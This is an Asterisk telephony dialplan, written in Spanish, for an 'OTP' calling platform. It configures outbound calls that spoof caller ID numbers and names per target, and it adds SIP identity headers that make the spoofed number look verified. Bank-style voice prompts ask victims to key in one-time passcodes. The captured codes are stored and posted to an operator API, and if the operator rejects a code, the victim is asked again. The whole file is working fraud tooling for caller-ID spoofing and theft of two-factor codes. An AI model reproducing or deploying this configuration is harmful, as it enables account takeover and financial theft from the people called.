; ========================================================
; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP
; Auto-generado por Anonymous OTP Asterisk Platform
; ========================================================

[general]
static=yes
writeprotect=no

[globals]
GLOBAL_CARRIER_HOST=televox.carrier.net
GLOBAL_DEFAULT_INTRO=custom/bienvenida_corporativa
GLOBAL_DEFAULT_PROMPT=custom/solicitar_codigo_otp
GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion
GLOBAL_DEFAULT_SUCCESS=custom/operacion_bloqueada_exito
GLOBAL_DEFAULT_AGENT=custom/conectar_asesor_banco

; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real
[sub-pjsip-headers]
exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: ${CHANNEL} ===)
 same => n,Set(PJSIP_HEADER(add,Privacy)=none)
 same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:${CALLERID(num)}@${GLOBAL_CARRIER_HOST}>)
 same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:${CALLERID(num)}@${GLOBAL_CARRIER_HOST}>\;party=calling\;screen=yes\;privacy=off)
 same => n,Return()

[from-internal]
; 1. Llamadas internas entre extensiones (1001-1999)
exten => _1XXX,1,NoOp(Llamada interna a extension ${EXTEN})
 same => n,Dial(PJSIP/${EXTEN},30,Tt)
 same => n,Hangup()

; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 7777)
exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)
 same => n,Answer()
 same => n,Wait(0.5)
 same => n,Set(AGENT_CHAN=${IF($["${BLINDTRANSFER}" != ""]?${BLINDTRANSFER}:${TRANSFERERNAME})})
 same => n,Set(AGENT_PARSED=${CUT(CUT(AGENT_CHAN,-,1),/,2)})
 same => n,Set(FINAL_AGENT=${IF($["${AGENT_PARSED}" != ""]?${AGENT_PARSED}:${IF($["${CALLING_AGENT}" != ""]?${CALLING_AGENT}:${IF($["${CALLERID(num)}" != ""]?${CALLERID(num)}:1002)})})})
 same => n,Set(TARGET_DEST=${IF($["${CALL_DEST}" != ""]?${CALL_DEST}:${CALLERID(num)})})
 same => n,NoOp(Cliente: ${TARGET_DEST} | Retornara al Agente: ${FINAL_AGENT})
 same => n,Goto(ivr-captura-vivo,s,1)

exten => 777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 777 ===)
 same => n,Answer()
 same => n,Wait(0.5)
 same => n,Set(AGENT_CHAN=${IF($["${BLINDTRANSFER}" != ""]?${BLINDTRANSFER}:${TRANSFERERNAME})})
 same => n,Set(AGENT_PARSED=${CUT(CUT(AGENT_CHAN,-,1),/,2)})
 same => n,Set(FINAL_AGENT=${IF($["${AGENT_PARSED}" != ""]?${AGENT_PARSED}:${IF($["${CALLING_AGENT}" != ""]?${CALLING_AGENT}:${IF($["${CALLERID(num)}" != ""]?${CALLERID(num)}:1002)})})})
 same => n,Set(TARGET_DEST=${IF($["${CALL_DEST}" != ""]?${CALL_DEST}:${CALLERID(num)})})
 same => n,Goto(ivr-captura-vivo,s,1)

; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)
exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)
 same => n,Set(IS_TEST_CALL=1)
 same => n,Set(CALL_DEST=8888)
 same => n,Set(CALLING_AGENT=${CALLERID(num)})
 same => n,Set(IVR_AGENT_EXTEN=1001)
 same => n,Goto(ivr-otp,s,1)

; 2c. Acceso a Simulador IVR Local en Auricular (*8888 o 8880)
exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension ${CALLERID(num)})
 same => n,Set(IS_TEST_CALL=1)
 same => n,Set(CALL_DEST=8888)
 same => n,Goto(ivr-otp,s,1)
exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension ${CALLERID(num)})
 same => n,Set(IS_TEST_CALL=1)
 same => n,Set(CALL_DEST=8888)
 same => n,Goto(ivr-otp,s,1)

; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)
exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a ${EXTEN} via televox)
 same => n,Set(CALLING_AGENT=${CALLERID(num)})
 same => n,Set(TARGET_DEST=${EXTEN})
 same => n,Set(CUSTOM_CID_NUM=${DB(ivr_vars/${EXTEN}_cid_num)})
 same => n,Set(CUSTOM_CID_NAME=${DB(ivr_vars/${EXTEN}_cid_name)})
 same => n,ExecIf($["${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=${CUSTOM_CID_NUM}))
 same => n,ExecIf($["${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=${CUSTOM_CID_NAME}))
 same => n,ExecIf($["${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="${CALLERID(name)}" <${CALLERID(num)}>))
 same => n,Dial(PJSIP/${EXTEN}@televox,60,b(sub-pjsip-headers^s^1))
 same => n,Hangup()

; 4. Regla Saliente USA / Canada 10 digitos (ej. 6104803845 -> prepends 1)
exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1${EXTEN} via televox)
 same => n,Set(CALLING_AGENT=${CALLERID(num)})
 same => n,Set(TARGET_DEST=${EXTEN})
 same => n,Set(CUSTOM_CID_NUM=${DB(ivr_vars/${EXTEN}_cid_num)})
 same => n,Set(CUSTOM_CID_NAME=${DB(ivr_vars/${EXTEN}_cid_name)})
 same => n,ExecIf($["${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=${CUSTOM_CID_NUM}))
 same => n,ExecIf($["${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=${CUSTOM_CID_NAME}))
 same => n,ExecIf($["${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="${CALLERID(name)}" <${CALLERID(num)}>))
 same => n,Dial(PJSIP/1${EXTEN}@televox,60,b(sub-pjsip-headers^s^1))
 same => n,Hangup()

; 5. Regla Saliente Universal (Cualquier longitud)
exten => _X.,1,NoOp(Llamada Saliente a ${EXTEN} via televox)
 same => n,Set(CALLING_AGENT=${CALLERID(num)})
 same => n,Set(TARGET_DEST=${EXTEN})
 same => n,Set(CUSTOM_CID_NUM=${DB(ivr_vars/${EXTEN}_cid_num)})
 same => n,Set(CUSTOM_CID_NAME=${DB(ivr_vars/${EXTEN}_cid_name)})
 same => n,ExecIf($["${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=${CUSTOM_CID_NUM}))
 same => n,ExecIf($["${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=${CUSTOM_CID_NAME}))
 same => n,ExecIf($["${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="${CALLERID(name)}" <${CALLERID(num)}>))
 same => n,Dial(PJSIP/${EXTEN}@televox,60,b(sub-pjsip-headers^s^1))
 same => n,Hangup()

[from-trunk]
exten => _X.,1,NoOp(Llamada Entrante por Troncal: ${CALLERID(num)})
 same => n,Goto(ivr-otp,s,1)

; ========================================================
; CONTEXTO CAPTURA EN VIVO EXTENSION 7777 / 777
; Mensaje: "Por favor digite su codigo seguido de la tecla de numero (#)"
; ========================================================
[ivr-captura-vivo]
exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO: ${TARGET_DEST} ===)
 same => n,Answer()
 same => n,Wait(0.5)
 same => n,Set(FINAL_AGENT=${IF($["${FINAL_AGENT}" != ""]?${FINAL_AGENT}:1002)})
 same => n,Set(TARGET_DEST=${IF($["${TARGET_DEST}" != ""]?${TARGET_DEST}:${CALLERID(num)})})
 ; Buscar audio configurado para la extension 7777
 same => n,Set(AUDIO_7777=${DB(ivr_vars/7777_intro)})
 same => n,ExecIf($["${AUDIO_7777}" = ""]?Set(AUDIO_7777=${DB(ivr_vars/7777_prompt)}))
 same => n,ExecIf($["${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))
 same => n,ExecIf($["${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))
 same => n,ExecIf($["${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/digite_token_6_digitos))
 same => n,NoOp(Reproduciendo audio de bienvenida en 7777: ${AUDIO_7777})
 ; Read reproduce el audio y captura digitos hasta presionar '#' o 8 digitos
 same => n,Read(USER_DIGITS,${AUDIO_7777},8,,2,15)
 same => n,GotoIf($["${USER_DIGITS}" != ""]?captura_ok)
 same => n,Playback(beep)
 same => n,Read(USER_DIGITS,beep,8,,2,10)
 same => n,GotoIf($["${USER_DIGITS}" = ""]?captura_timeout)

 same => n(captura_ok),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: ${USER_DIGITS} ===)
 same => n,Set(DB(otp_codes/${TARGET_DEST})=${USER_DIGITS})
 same => n,Set(DB(otp_status/${TARGET_DEST})=pending)
 same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=${TARGET_DEST}&otp=${USER_DIGITS}&channel=${CHANNEL}&status=pending" &)
 same => n,Playback(beep)
 same => n,Wait(0.5)
 same => n,NoOp(=== [CAPTURA-7777] RETORNANDO AL AGENTE ${FINAL_AGENT} ===)
 same => n,Dial(PJSIP/${FINAL_AGENT},60,Tt)
 same => n,Hangup()

 same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT -> RETORNANDO AL AGENTE ${FINAL_AGENT} ===)
 same => n,Playback(beep)
 same => n,Dial(PJSIP/${FINAL_AGENT},60,Tt)
 same => n,Hangup()

[ivr-otp]
exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)
 same => n,Answer()
 same => n,Wait(1)
 same => n,Set(TARGET_DEST=${IF($["${CALL_DEST}" != ""]?${CALL_DEST}:${CALLERID(num)})})
 same => n,Set(CUSTOM_CID_NUM=${DB(ivr_vars/${TARGET_DEST}_cid_num)})
 same => n,Set(CUSTOM_CID_NAME=${DB(ivr_vars/${TARGET_DEST}_cid_name)})
 same => n,ExecIf($["${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=${CUSTOM_CID_NUM}))
 same => n,ExecIf($["${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=${CUSTOM_CID_NAME}))
 same => n,ExecIf($["${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="${CALLERID(name)}" <${CALLERID(num)}>))
 same => n,Set(IVR_INTRO=${DB(ivr_vars/${TARGET_DEST}_intro)})
 same => n,ExecIf($["${IVR_INTRO}" = ""]?Set(IVR_INTRO=${DB(ivr_vars/8888_intro)}))
 same => n,ExecIf($["${IVR_INTRO}" = ""]?Set(IVR_INTRO=${DB(ivr_vars/default_intro)}))
 same => n,ExecIf($["${IVR_INTRO}" = ""]?Set(IVR_INTRO=${DB(ivr_vars/global_intro)}))
 same => n,ExecIf($["${IVR_INTRO}" = ""]?Set(IVR_INTRO=${GLOBAL_DEFAULT_INTRO}))
 same => n,ExecIf($["${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/bienvenida_corporativa))
 same => n,Set(IVR_PROMPT=${DB(ivr_vars/${TARGET_DEST}_prompt)})
 same => n,ExecIf($["${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=${DB(ivr_vars/8888_prompt)}))
 same => n,ExecIf($["${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=${DB(ivr_vars/default_prompt)}))
 same => n,ExecIf($["${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=${DB(ivr_vars/global_prompt)}))
 same => n,ExecIf($["${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=${GLOBAL_DEFAULT_PROMPT}))
 same => n,ExecIf($["${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=custom/solicitar_codigo_otp))
 same => n,Set(IVR_WAIT=${DB(ivr_vars/${TARGET_DEST}_wait)})
 same => n,ExecIf($["${IVR_WAIT}" = ""]?Set(IVR_WAIT=${DB(ivr_vars/8888_wait)}))
 same => n,ExecIf($["${IVR_WAIT}" = ""]?Set(IVR_WAIT=${DB(ivr_vars/default_wait)}))
 same => n,ExecIf($["${IVR_WAIT}" = ""]?Set(IVR_WAIT=${GLOBAL_DEFAULT_WAIT}))
 same => n,ExecIf($["${IVR_WAIT}" = ""]?Set(IVR_WAIT=custom/un_momento_validando_informacion))
 same => n,Set(IVR_SUCCESS=${DB(ivr_vars/${TARGET_DEST}_success)})
 same => n,ExecIf($["${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=${DB(ivr_vars/8888_success)}))
 same => n,ExecIf($["${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=${DB(ivr_vars/default_success)}))
 same => n,ExecIf($["${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=${GLOBAL_DEFAULT_SUCCESS}))
 same => n,ExecIf($["${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/operacion_bloqueada_exito))
 same => n,Set(IVR_AGENT=${DB(ivr_vars/${TARGET_DEST}_agent)})
 same => n,ExecIf($["${IVR_AGENT}" = ""]?Set(IVR_AGENT=${DB(ivr_vars/default_agent)}))
 same => n,ExecIf($["${IVR_AGENT}" = ""]?Set(IVR_AGENT=${GLOBAL_DEFAULT_AGENT}))
 same => n,ExecIf($["${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))
 same => n,Set(IVR_AGENT_EXTEN=${DB(ivr_vars/${TARGET_DEST}_agent_exten)})
 same => n,ExecIf($["${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))
 same => n,Set(IVR_FAILURE=${DB(ivr_vars/${TARGET_DEST}_failure)})
 same => n,ExecIf($["${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=${DB(ivr_vars/8888_failure)}))
 same => n,ExecIf($["${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=${DB(ivr_vars/default_failure)}))
 same => n,ExecIf($["${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=custom/token_invalido_reintente))
 same => n,Set(IVR_INVALID=${DB(ivr_vars/${TARGET_DEST}_invalid)})
 same => n,ExecIf($["${IVR_INVALID}" = ""]?Set(IVR_INVALID=${DB(ivr_vars/8888_invalid)}))
 same => n,ExecIf($["${IVR_INVALID}" = ""]?Set(IVR_INVALID=${DB(ivr_vars/default_invalid)}))
 same => n,ExecIf($["${IVR_INVALID}" = ""]?Set(IVR_INVALID=custom/opcion_invalida))
 same => n,NoOp(Audios Destino ${TARGET_DEST}: Intro=${IVR_INTRO}, Prompt=${IVR_PROMPT}, Wait=${IVR_WAIT}, Fail=${IVR_FAILURE})
 same => n,NoOp(=== [IVR] Reproduciendo Audio de Bienvenida interactivo: ${IVR_INTRO} ===)
 same => n,Background(${IVR_INTRO})
 same => n,WaitExten(2)
 same => n,Goto(ask_input)

 same => n(ask_input),NoOp(=== [IVR] Solicitando Codigo OTP con audio: ${IVR_PROMPT} ===)
 same => n,Read(USER_DIGITS,${IVR_PROMPT},6,,2,10)
 same => n,GotoIf($["${USER_DIGITS}" != ""]?check_input)
 same => n,Playback(beep)
 same => n,Read(USER_DIGITS,beep,6,,2,6)
 same => n(check_input),NoOp(=== [IVR] DIGITOS RECIBIDOS DEL TECLADO: ${USER_DIGITS} ===)
 same => n,GotoIf($["${USER_DIGITS}" = "1"]?press1_transfer)
 same => n,GotoIf($["${LEN(${USER_DIGITS})}" >= "4"]?otp_confirm:no_input)

 same => n(otp_confirm),NoOp(=== [IVR] CODIGO OTP INGRESADO: ${USER_DIGITS} -> NOTIFICAR A ASESOR ===)
 same => n,Set(DB(otp_captures/${TARGET_DEST})=${USER_DIGITS})
 same => n,Set(DB(otp_status/${TARGET_DEST})=pending)
 same => n,Set(DB(otp_captures/${CALLERID(num)})=${USER_DIGITS})
 same => n,Set(DB(otp_status/${CALLERID(num)})=pending)
 same => n,Set(DB(otp_last_capture)=${USER_DIGITS})
 same => n,UserEvent(OTPCaptured,Number=${TARGET_DEST},Digits=${USER_DIGITS},Status=pending)
 same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=${TARGET_DEST}&otp=${USER_DIGITS}&channel=${CHANNEL}&status=pending" &)
 same => n,NoOp(=== [IVR] Reproduciendo audio de validacion en curso: ${IVR_WAIT} ===)
 same => n,Playback(${IVR_WAIT})
 same => n,Wait(1)
 same => n,NoOp(=== [IVR] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)
 same => n,Set(WAIT_LOOP=0)
 same => n(wait_decision_loop),Set(WAIT_LOOP=$[${WAIT_LOOP} + 1])
 same => n,Set(CURRENT_STATUS=${DB(otp_status/${TARGET_DEST})})
 same => n,NoOp(=== [IVR] Ciclo ${WAIT_LOOP}/20 - Estado en AstDB: ${CURRENT_STATUS} ===)
 same => n,GotoIf($["${CURRENT_STATUS}" = "valid"]?otp_approved)
 same => n,GotoIf($["${CURRENT_STATUS}" = "invalid"]?otp_rejected_retry)
 same => n,GotoIf($[${WAIT_LOOP} >= 20]?otp_approved)
 same => n,Wait(1)
 same => n,Goto(wait_decision_loop)

 same => n(otp_approved),NoOp(=== [IVR] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR ===)
 same => n,Playback(${IVR_SUCCESS})
 same => n,Wait(1)
 same => n,Set(CALLER_EXT=${CALLERID(num)})
 same => n,Set(FINAL_AGENT=${IF($["${IVR_AGENT_EXTEN}" != ""]?${IVR_AGENT_EXTEN}:1001)})
 same => n,ExecIf($["${CALLER_EXT}" = "${FINAL_AGENT}"]?Set(FINAL_AGENT=1002))
 same => n,NoOp(=== [IVR] RECONECTANDO LLAMADA CON EL ASESOR EN EXTENSION ${FINAL_AGENT} ===)
 same => n,Dial(PJSIP/${FINAL_AGENT},60)
 same => n,Hangup()

 same => n(otp_rejected_retry),NoOp(=== [IVR] TOKEN INVALIDO DETECTADO -> SOLICITANDO NUEVO CODIGO AUTOMATICAMENTE ===)
 same => n,Set(DB(otp_status/${TARGET_DEST})=pending)
 same => n,Playback(${IVR_FAILURE})
 same => n,Goto(ask_input)

 same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL 8888 EXITOSA: CÓDIGO ${USER_DIGITS} VALIDADO ===)
 same => n,Playback(beep)
 same => n,Wait(1)
 same => n,Hangup()

 same => n(press1_transfer),NoOp(=== [IVR] PRESS 1 DETECTADO: TRANSFIRIENDO LLAMADA AL ASESOR ===)
 same => n,ExecIf($["${IVR_AGENT}" != ""]?Playback(${IVR_AGENT}):Playback(custom/conectar_asesor_banco))
 same => n,Set(FINAL_AGENT=${IF($["${IVR_AGENT_EXTEN}" != ""]?${IVR_AGENT_EXTEN}:1001)})
 same => n,NoOp(=== [IVR] MARCANDO EXTENSION DE AGENTE: ${FINAL_AGENT} ===)
 same => n,Dial(PJSIP/${FINAL_AGENT},60)
 same => n,Hangup()

 same => n(no_input),NoOp(=== SIN ENTRADA DTMF DETECTADA ===)
 same => n,Playback(beep)
 same => n,Hangup()

exten => 1,1,NoOp(=== [IVR] PRESS 1 DIRECTO -> ASESOR 1001 ===)
 same => n,ExecIf($["${IVR_AGENT}" != ""]?Playback(${IVR_AGENT}):Playback(custom/conectar_asesor_banco))
 same => n,Set(FINAL_AGENT=${IF($["${IVR_AGENT_EXTEN}" != ""]?${IVR_AGENT_EXTEN}:1001)})
 same => n,Dial(PJSIP/${FINAL_AGENT},60,Tt)
 same => n,Hangup()

exten => _XXXX,1,Set(USER_DIGITS=${EXTEN})
 same => n,Goto(s,otp_confirm)
exten => _XXXXX,1,Set(USER_DIGITS=${EXTEN})
 same => n,Goto(s,otp_confirm)
exten => _XXXXXX,1,Set(USER_DIGITS=${EXTEN})
 same => n,Goto(s,otp_confirm)
exten => _XXXXXXX,1,Set(USER_DIGITS=${EXTEN})
 same => n,Goto(s,otp_confirm)
exten => _XXXXXXXX,1,Set(USER_DIGITS=${EXTEN})
 same => n,Goto(s,otp_confirm)
